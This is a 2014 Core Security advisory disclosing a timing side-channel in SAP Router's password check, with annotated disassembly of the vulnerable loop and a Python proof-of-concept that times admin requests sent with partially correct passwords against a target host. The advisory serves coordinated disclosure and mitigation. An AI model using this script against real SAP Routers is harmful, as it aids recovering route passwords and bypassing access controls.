@@ -1,0 +1,487 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+SAP Router Password Timing Attack
+
+
+1. *Advisory Information*
+
+Title: SAP Router Password Timing Attack
+Advisory ID: CORE-2014-0003
+Advisory URL:
+http://www.coresecurity.com/advisories/sap-router-password-timing-attack
+Date published: 2014-04-15
+Date of last update: 2014-03-06
+Vendors contacted: SAP
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Information Exposure Through Timing Discrepancy [CWE-208]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2014-0984
+
+
+3. *Vulnerability Description*
+
+
+      SAP Router [1]  is an application-level gateway used to
+      connect systems in a SAP infrastructure. A vulnerability
+      have been found in SAP Router that could allow an unauthenticated
+      remote attacker to obtain passwords used to protect route entries
+by a
+      timing side-channel attack.
+    
+
+
+4. *Vulnerable Packages*
+
+   . SAP Router release 721 patch level 117.
+   . SAP Router release 720 patch level 411.
+   . SAP Router release 710 patch level 029.
+   . Other versions are probably affected too, but they were not checked.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+
+      SAP released the security note
+https://service.sap.com/sap/support/notes/1986895
+      regarding these issues. Contact SAP for further information.
+    
+
+
+      Martin Gallo proposed the following actions to mitigate the
+      impact of the vulnerabilities:
+      
+
+   1. Disable the use of passwords on the Route Permission Table [2].
+      
+   2. Enforce the use of SNC (Secure Network Communications) as an
+      authentication mechanism for securing routes.
+        
+
+6. *Credits*
+
+
+      This vulnerability was discovered and researched by Martin Gallo
+from Core
+      Security Consulting Services. The publication of this advisory was
+      coordinated by Fernando Miranda from Core Advisories Team.
+    
+
+
+7. *Technical Description / Proof of Concept Code*
+
+
+      SAP Router permits and/or forbids networks connections based on a
+      Route Permission Table [2]. Entries in the
+      Route Permission Table can have a password. If a password is
+specified
+      for a given entry in the Route Permission Table, SAP Router checks
+whether
+      the user-supplied password matches with the one in the Route
+Permission
+      Table entry before permitting a connection.
+    
+
+
+      The vulnerable function 'passwordCheck'
+      performs a non-constant time string comparison for checking the
+      user-supplied password against the on in the Route Permission Table.
+      On the first non-matched character, the string comparison function
+      immediately interrupts the evaluation cycle, which may let an
+attacker perform timing attacks.
+      The following snippet shows an excerpt of the vulnerable code
+within the
+      'passwordCheck' function:
+    
+
+
+/-----
+.text:0000000140005BE0 loc_140005BE0:                          ; CODE
+XREF: passwordCheck+191j
+.text:0000000140005BE0                 movzx   ecx, byte ptr [rdi] ; rdi
+points to the routtab password
+.text:0000000140005BE3                 movzx   eax, byte ptr [rdi+rsi] ;
+rdi+rsi points to the user-supplied password
+.text:0000000140005BE7                 sub     ecx, eax
+.text:0000000140005BE9                 jnz     short loc_140005BF3 ;
+password check failed
+.text:0000000140005BEB                 add     rdi, 1
+.text:0000000140005BEF                 test    eax, eax
+.text:0000000140005BF1                 jnz     short loc_140005BE0
+.text:0000000140005BF3
+.text:0000000140005BF3 loc_140005BF3:                          ; CODE
+XREF: passwordCheck+189j
+.text:0000000140005BF3                 test    ecx, ecx
+.text:0000000140005BF5                 jz      short loc_140005C3F
+.text:0000000140005BF7                 cmp     cs:trace_level, 1
+.text:0000000140005BFE                 jl      short loc_140005C38
+.text:0000000140005C00                 call    DpLock
+.text:0000000140005C05                 mov     rcx, cs:qword_140273BC0
+.text:0000000140005C0C                 lea     r8, aPasswordcheck ;
+"passwordCheck"
+.text:0000000140005C13                 lea     rdx, aSPasswordCheck ;
+"%s: password check failed\n"
+.text:0000000140005C1A                 mov     cs:dword_1401ADAA4, 1
+.text:0000000140005C24                 call    DpTrace
+.text:0000000140005C29
+.text:0000000140005C29 loc_140005C29:                          ; CODE
+XREF: passwordCheck+16Fj
+.text:0000000140005C29                 mov     cs:dword_1401ADAA4, 2
+.text:0000000140005C33                 call    DpUnlock
+.text:0000000140005C38
+.text:0000000140005C38 loc_140005C38:                          ; CODE
+XREF: passwordCheck+135j
+.text:0000000140005C38                                         ;
+passwordCheck+19Ej
+.text:0000000140005C38                 mov     eax, 0FFFFFFA2h
+.text:0000000140005C3D                 jmp     short loc_140005C41
+.text:0000000140005C3F ;
+---------------------------------------------------------------------------
+.text:0000000140005C3F
+.text:0000000140005C3F loc_140005C3F:                          ; CODE
+XREF: passwordCheck+12Cj
+.text:0000000140005C3F                                         ;
+passwordCheck+174j ...
+.text:0000000140005C3F                 xor     eax, eax        ;
+password check succeeded
+
+-----/
+
+
+7.1. *Proof of Concept*
+
+
+/-----
+#!/usr/bin/python
+## ===========
+## pysap - Python library for crafting SAP's network protocols packets
+##
+## Copyright (C) 2014 Core Security Technologies
+##
+## The library was designed and developed by Martin Gallo from the Security
+## Consulting Services team of Core Security Technologies.
+##
+## This program is free software; you can redistribute it and/or
+## modify it under the terms of the GNU General Public License
+## as published by the Free Software Foundation; either version 2
+## of the License, or (at your option) any later version.
+##
+## This program is distributed in the hope that it will be useful,
+## but WITHOUT ANY WARRANTY; without even the implied warranty of
+## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+## GNU General Public License for more details.
+##==============
+
+# Standard imports
+import logging
+from optparse import OptionParser, OptionGroup
+# External imports
+import fau_timer
+from scapy.config import conf
+from scapy.supersocket import socket
+# Custom imports
+from pysap.SAPNI import SAPNI, SAPNIStreamSocket
+from pysap.SAPRouter import SAPRouter, router_is_control
+
+
+# Set the verbosity to 0
+conf.verb = 0
+
+
+# Command line options parser
+def parse_options():
+
+    description = \
+    """This example script connects with a SAP Router service and makes an
+    information request using a provided password. It then records the
+    time the remote service takes to respond to the request. Further
+analysis
+    of the time records could be performed in order to identify whether the
+    server is vulnerable to a timing attack on the password check.
+
+    """
+
+    epilog = \
+    """pysap -
+http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=tool&name=pysap"""
+
+    usage = "Usage: %prog [options] -d <remote host>"
+
+    parser = OptionParser(usage=usage, description=description,
+epilog=epilog)
+
+    target = OptionGroup(parser, "Target")
+    target.add_option("-d", "--remote-host", dest="remote_host",
+help="Remote host [%default]", default="127.0.0.1")
+    target.add_option("-p", "--remote-port", dest="remote_port",
+type="int", help="Remote port [%default]", default=3299)
+    target.add_option("--router-version", dest="router_version",
+type="int", help="SAP Router version to use [retrieve from the remote
+SAP Router]")
+    parser.add_option_group(target)
+
+    misc = OptionGroup(parser, "Misc options")
+    misc.add_option("-t", "--tries", dest="tries", default=10,
+type="int", help="Amount of tries to make for each length [%default]")
+    misc.add_option("--password", dest="password", default="password",
+help="Correct password to test")
+    misc.add_option("-o", "--output", dest="output",
+default="output.csv", help="Output file [%default]")
+    misc.add_option("-v", "--verbose", dest="verbose",
+action="store_true", default=False, help="Verbose output [%default]")
+    parser.add_option_group(misc)
+
+    (options, _) = parser.parse_args()
+
+    if not options.remote_host:
+        parser.error("Remote host is required")
+
+    return options
+
+
+# Retrieve the version of the remote SAP Router
+def get_router_version(connection):
+    r = connection.sr(SAPRouter(type=SAPRouter.SAPROUTER_CONTROL,
+version=40, opcode=1))
+    if router_is_control(r) and r.opcode == 2:
+        return r.version
+    else:
+        return None
+
+
+def try_password(options, password, output=None, k=0):
+
+    p = SAPRouter(type=SAPRouter.SAPROUTER_ADMIN,
+version=options.router_version)
+    p.adm_command = 2
+    p.adm_password = password
+    p = str(SAPNI() / p)
+
+    fau_timer.init()
+    fau_timer.send_request(options.remote_host, options.remote_port, p,
+len(p))
+    fau_timer.calculate_time()
+    cpuSpeed = fau_timer.get_speed()
+    cpuTicks = fau_timer.get_cpu_ticks()
+    time = fau_timer.get_time()
+
+    if options.verbose:
+        print "Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s
+nanosec" % (cpuSpeed, cpuTicks, time)
+
+    # Write the time to the output file
+    if output:
+        output.write("%i,%s,%s\n" % (k, password, time))
+
+    return time
+
+
+# Main function
+def main():
+    options = parse_options()
+
+    if options.verbose:
+        logging.basicConfig(level=logging.DEBUG)
+
+    # Initiate the connection
+    sock = socket.socket()
+    sock.connect((options.remote_host, options.remote_port))
+    conn = SAPNIStreamSocket(sock)
+    print "[*] Connected to the SAP Router %s:%d" %
+(options.remote_host, options.remote_port)
+
+    # Retrieve the router version used by the server if not specified
+    if options.router_version is None:
+        options.router_version = get_router_version(conn)
+
+    print "[*] Using SAP Router version %d" % options.router_version
+
+    print "[*] Checking if the server is vulnerable to a timing attack ..."
+
+    with open(options.output, "w") as f:
+
+        c = 0
+        for i in range(0, len(options.password) + 1):
+            password = options.password[:i] + "X" *
+(len(options.password) - i)
+            print "[*] Trying with password (%s) len %d" % (password,
+len(password))
+            for _ in range(0, options.tries):
+                try_password(options, password, f, c)
+                c += 1
+
+
+if __name__ == "__main__":
+    main()
+
+-----/
+
+
+8. *Report Timeline*
+. 2014-02-20:
+
+          Initial notification sent to SAP, including technical description
+          to reproduce the vulnerability. Publication date set to March
+11, 2014.        
+      
+
+. 2014-02-20:
+
+        Vendor notifies that the tracking number 1068415-2014 was
+created for this issue.
+      
+
+. 2014-02-28:
+
+        Vendor notifies that they will not be able to provide
+        a fix for the reported issue for the tentative release date,
+March 11th,
+        and ask for delaying the advisory publication.
+      
+
+. 2014-03-03:
+
+        Vendor notifies that they currently do not see it as a
+vulnerability
+        and asks for additional technical details.      
+      
+
+. 2014-03-05:
+
+        Core sends additional information regarding how to exploit this
+vulnerability
+        solving the network letency and other practical issues.
+Additional publications
+        on this topic were also included [3],
+        [4], [5].
+      
+
+. 2014-03-07:
+
+        Vendor notifies that they will make changes for mitigating
+timing attacks.
+        Vendor also notifies that they usually release security fixes
+        on Patch Days (every second Tuesday per month), and April 8th
+        or May 13th seems much more realistic dates for releasing fixes.
+      
+
+. 2014-03-26:
+
+        Vendor requests pushing the advisory release until May 13th.
+      
+
+. 2014-04-03:
+
+        Core re-schedules the advisory publication for May 13th.
+      
+
+. 2014-03-11:
+
+        First release date missed.
+      
+
+. 2014-03-07:
+
+        Core re-schedules the advisory publication for April 8th.
+      
+
+. 2014-03-13:
+
+        Core sends a Proof of Concept and aditional technical information.
+      
+
+. 2014-04-07:
+
+        SAP notifies that they have released the security note 1986895
+        [6] on April Patch Day 2014.
+      
+
+. 2014-04-09:
+
+        Core notifies that the advisory is going to be re-schedule for
+the 15 of April.
+      
+
+. 2014-04-15:
+
+        Advisory CORE-2014-0003 published.
+      
+
+
+9. *References*
+
+[1]
+http://help.sap.com/saphelp_nw74/helpdata/en/48/7612ed5ca5055ee10000000a42189b/content.htm?frameset=/en/ea/214d2aafaa43feaee78375cb16552f/frameset.htm.
+
+    
+[2]
+http://help.sap.com/saphelp_nw74/helpdata/en/48/6c7a3fc1504e6ce10000000a421937/content.htm?frameset=/en/ea/214d2aafaa43feaee78375cb16552f/frameset.htm
+[3] http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.65.9811
+[4] http://www.youtube.com/watch?v=idjDiBtu93Y&feature=related
+[5] http://events.ccc.de/congress/2011/Fahrplan/attachments/2021_Slides
+[6]
+      SAP security note 1986895
+https://service.sap.com/sap/support/notes/1986895.
+    
+
+
+10. *About CoreLabs*
+
+    CoreLabs, the research center of Core Security Technologies, is
+charged with anticipating
+    the future needs and requirements for information security
+technologies.
+    We conduct our research in several important areas of computer security
+    including system vulnerabilities, cyber attack planning and simulation,
+    source code auditing, and cryptography. Our results include problem
+    formalization, identification of vulnerabilities, novel solutions and
+    prototypes for new technologies. CoreLabs regularly publishes security
+    advisories, technical papers, project information and shared software
+    tools for public use at:
+    http://corelabs.coresecurity.com.
+    
+
+
+11. *About Core Security Technologies*
+
+
+    Core Security Technologies enables organizations to get ahead of threats
+    with security test and measurement solutions that continuously identify
+    and demonstrate real-world exposures to their most critical assets. Our
+    customers can gain real visibility into their security standing, real
+    validation of their security controls, and real metrics to more
+    effectively secure their organizations.
+        
+
+
+    Core Security's software solutions build on over a decade of trusted
+    research and leading-edge threat expertise from the company's Security
+    Consulting Services, CoreLabs and Engineering groups. Core Security
+    Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+    http://www.coresecurity.com.
+    
+
+
+12. *Disclaimer*
+
+
+      The contents of this advisory are copyright
+      (c) 2014 Core Security Technologies and (c) 2014 CoreLabs,
+      and are licensed under a Creative Commons
+      Attribution Non-Commercial Share-Alike 3.0 (United States) License:
+      http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. *PGP/GPG Keys*
+
+
+      This advisory has been signed with the GPG key of Core Security
+Technologies
+      advisories team, which is available for download at
+     
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
